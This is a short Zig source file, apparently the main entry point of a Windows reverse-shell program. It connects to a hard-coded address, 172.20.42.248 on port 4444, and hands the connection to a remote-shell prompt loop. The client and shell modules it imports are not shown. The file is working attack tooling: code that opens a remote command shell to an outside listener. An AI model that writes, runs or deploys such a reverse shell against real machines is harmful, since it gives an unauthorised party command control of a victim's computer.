const std = @import("std");
const _client = @import("client/client.zig");
const _shell = @import("shell/shell.zig");

const win = std.os.windows;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    var client = try _client.Client.init("172.20.42.248", 4444, allocator);

    try client.connect();

    var shell = _shell.RemoteShell.init(client);

    std.debug.print("Entering prompt loop\n", .{});
    try shell.prompt_loop();
    std.debug.print("Prompt loop exited\n", .{});
}